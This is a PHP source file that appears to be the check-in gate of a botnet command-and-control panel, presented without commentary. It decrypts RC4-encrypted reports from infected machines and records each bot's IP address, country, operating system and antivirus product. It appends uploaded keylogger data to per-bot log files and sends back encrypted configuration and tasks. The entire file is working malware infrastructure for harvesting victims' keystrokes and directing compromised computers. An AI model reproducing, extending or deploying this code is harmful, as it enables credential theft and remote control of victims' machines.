<?php
include_once("config.php");
include_once("funcs.php");
include_once("db_req.php");

$ret = "";
if( $_SERVER["REQUEST_METHOD"] == "POST" &&
    isset($_SERVER["CONTENT_LENGTH"]) &&
    is_numeric($_SERVER["CONTENT_LENGTH"]))
{
    $db = new db_req;
    if($db->connect())
    {
        $regbot = false;
        $ip_info = $db->get_ip_info($_SERVER["REMOTE_ADDR"]);
        $v = rc4(file_get_contents("php://input"), $_SERVER["CONTENT_LENGTH"]);
        parse_post($v, $http_req);

        if(isset($http_req["br"]) && isset($http_req["kl"]))
        {
            parse_post(base64_decode($http_req["br"]), $bt);

            $current_time = time();
            if($db->sql_count_rows("bots", "bot_id = :id", array("id" => $bt["id"]))) {
                // bot already exists
                try{
                    $regbot = $db->sql_update_safe(
                    "UPDATE `bots` SET `ip_address` = :ip_address, `ip_address_sz` = :ip_address_sz, `country_code` = :country_code, `country_name` = :country_name, `os_int` = :os_int, `os_64b` = :os_64b, `antivirus` = :antivirus, `last_seen` = :last_seen, `reg_interval` = :reg_interval, `bot_version` = :bot_version WHERE `bot_id` = :bot_id", 
                    array(
                        "ip_address" => $ip_info["ip_address_bin"],
                        "ip_address_sz" => $ip_info["ip_address_sz"],
                        "country_code" => $ip_info["country_code"],
                        "country_name" => $ip_info["country_name"],
                        "os_int" => $bt["os"],
                        "os_64b" => $bt["os64"],
                        "antivirus" => $bt["av"],
                        "last_seen" => $current_time,
                        "bot_id" => $bt["id"],
                        "reg_interval" => $bt["inv"],
                        "bot_version" => $bt["ve"]
                    )
                );
                }catch(Exception $e) { file_put_contents("test.txt",$v."\n\n".print_r($e, true));}
            }
            else{
                // new bot
                try{
                    $regbot = $db->sql_query_safe("INSERT INTO `bots` (`bot_id`, `ip_address`, `ip_address_sz`, `country_code`, `country_name`, `os_int`, `os_64b`, `antivirus`, `reg_date`, `last_seen`, `reg_interval`, `bot_version`) VALUES ( :bot_id, :ip_address, :ip_address_sz, :country_code, :country_name, :os_int, :os_64b, :antivirus, :reg_date, :last_seen, :reg_interval, :bot_version)",
                            array(
                                "bot_id" => $bt["id"],
                                "ip_address" => $ip_info["ip_address_bin"],
                                "ip_address_sz" => $ip_info["ip_address_sz"],
                                "country_code" => $ip_info["country_code"],
                                "country_name" => $ip_info["country_name"],
                                "os_int" => $bt["os"],
                                "os_64b" => $bt["os64"],
                                "antivirus" => $bt["av"],
                                "reg_date" => $current_time,
                                "last_seen" => $current_time,
                                "reg_interval" => $bt["inv"],
                                "bot_version" => $bt["ve"]
                            ));
                }catch(Exception $e) { file_put_contents("test.txt",$v."\n\n".print_r($e, true));}
            }
            if(strlen(($kl = base64_decode($http_req["kl"]))))
            {
                if(!$db->sql_count_rows("logs", "bot_id = :bot_id", array("bot_id" => $bt["id"])))
                    $db->sql_query_safe("INSERT INTO `logs` (`bot_id`) VALUES (:bot_id)", array("bot_id" => $bt["id"]));

                $regbot = $db->sql_update_safe(
                    "UPDATE `logs` SET `last_update` = :last_update WHERE `bot_id` = :bot_id", 
                    array("last_update" => $current_time, "bot_id" => $bt["id"]));
                
                file_put_contents("data/logs/" . $bt["id"], $kl, FILE_APPEND | LOCK_EX);
            }

            if($regbot)
            {
                $ret = "c=" . $db->get_config_bot() . "&t=" . $db->get_task_bot($bt["id"]);
            }

        } else file_put_contents("test.txt", $v);
    }
}
die(rc4($ret, strlen($ret)));
?>
